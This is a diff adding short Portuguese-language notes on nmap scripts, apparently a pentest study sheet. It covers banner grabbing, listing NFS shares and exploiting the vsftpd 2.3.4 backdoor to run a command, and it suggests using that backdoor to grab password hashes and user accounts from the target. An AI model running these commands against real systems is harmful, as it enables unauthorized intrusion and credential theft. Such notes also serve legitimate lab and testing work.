@@ -1,0 +1,21 @@
+Os scripts nmap estão localizados em:
+/usr/share/nmap/script
+
+
+namp --script-help script.nse
+
+Script captura de banner:
+
+nmap 192.168.1.1 -p 25 --script banner.nse         (pode especificar a porta ou não)
+-------------------------------
+
+Script para listagem de compartilhamento NFS (Podendo aproveitar a falha para montar as unidades)
+
+nmap --script=nfs-ls 192.168.1.17
+-------------------------------
+
+Script para exploração de falha do vsftpd 2.3.4 (backdoor)
+
+nmap --script ftp-vsftp-backdoor.nse --script-args ftp-vsftpd-backdoor.cmd="ls" 192.168.1.17
+    OBS: Esse script exige o argumento para rodar o comando no backdoor, no exemplo usamos o "ls"
+        OBS: Usar criatividade, pois pode se capturar hashs de senhas, usuarios de sistemas e etc no sistema alvo
